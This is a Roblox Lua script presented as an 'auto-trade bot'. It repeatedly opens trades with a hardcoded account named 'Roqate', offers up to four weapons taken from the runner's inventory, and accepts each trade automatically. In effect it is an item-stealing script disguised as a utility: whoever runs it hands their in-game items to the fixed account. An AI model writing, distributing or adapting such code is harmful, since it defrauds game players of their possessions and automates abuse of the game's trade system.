-- Ultimate Auto-Trade Bot with Weapon Detection (Syntax-Corrected)
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

-- Config
local TARGET_PLAYER = "Roqate"
local MAX_ITEMS_PER_TRADE = 4
local TRADE_COOLDOWN = 5 -- Seconds between trades
local ITEM_ADD_DELAY = 0.3 -- Delay between adding items
local GUI_CHECK_INTERVAL = 0.5 -- Added missing variable

-- Remotes
local TradeRemotes = {
    SendRequest = ReplicatedStorage:WaitForChild("Trade"):WaitForChild("SendRequest"),
    OfferItem = ReplicatedStorage:WaitForChild("Trade"):WaitForChild("OfferItem"),
    AcceptTrade = ReplicatedStorage:WaitForChild("Trade"):WaitForChild("AcceptTrade")
}

-- Trade state
local isTrading = false
local lastTradeTime = 0

-- Find player by name
local function findPlayer(name)
    for _, player in ipairs(Players:GetPlayers()) do
        if player.Name:lower() == name:lower() then
            return player
        end
    end
    return nil
end

-- Check if trade GUI is open
local function isTradeGUIOpen()
    return LocalPlayer.PlayerGui:FindFirstChild("TradeGUI") or LocalPlayer.PlayerGui:FindFirstChild("TradeGUI_Phone")
end

-- Get ALL weapons from PlayerGui.MainGUI.Game.Weapons
local function getAllWeapons()
    local weapons = {}
    
    local weaponsContainer = LocalPlayer.PlayerGui:WaitForChild("MainGUI"):WaitForChild("Game"):WaitForChild("Weapons")
    
    for _, item in ipairs(weaponsContainer:GetDescendants()) do
        if (item:IsA("TextButton") or (item:IsA("ImageButton")) and item.Visible then
            table.insert(weapons, item.Name)
            if #weapons >= MAX_ITEMS_PER_TRADE then
                break
            end
        end
    end
    
    return weapons
end

-- Add weapons to trade
local function addWeaponsToTrade()
    local weapons = getAllWeapons()
    
    if #weapons == 0 then
        warn("No weapons found in the GUI!")
        return false
    end
    
    for i = 1, math.min(#weapons, MAX_ITEMS_PER_TRADE) do
        TradeRemotes.OfferItem:FireServer(weapons[i], "Weapons")
        wait(ITEM_ADD_DELAY)
    end
    
    return true
end

-- Accept trade
local function acceptTrade()
    if not isTradeGUIOpen() then
        warn("Trade GUI not open!")
        return false
    end
    
    TradeRemotes.AcceptTrade:FireServer(285646582)
    return true
end

-- Main trade function
local function initiateTrade(targetPlayer)
    if isTrading or (os.time() - lastTradeTime) < TRADE_COOLDOWN then
        return
    end
    
    isTrading = true
    print("Starting trade with " .. targetPlayer.Name .. "...") -- Fixed string concatenation
    
    TradeRemotes.SendRequest:InvokeServer(targetPlayer)
    wait(1)
    
    if not isTradeGUIOpen() then
        warn("Trade failed to open!")
        isTrading = false
        return
    end
    
    if not addWeaponsToTrade() then
        isTrading = false
        return
    end
    
    if not acceptTrade() then
        warn("Failed to accept trade!")
    else
        print("Trade with " .. targetPlayer.Name .. " completed!") -- Fixed string concatenation
    end
    
    isTrading = false
    lastTradeTime = os.time()
end

-- Main loop
while true do
    local target = findPlayer(TARGET_PLAYER)
    if target then
        initiateTrade(target)
    else
        print(TARGET_PLAYER .. " not found. Waiting...") -- Fixed string concatenation
    end
    wait(5)
end
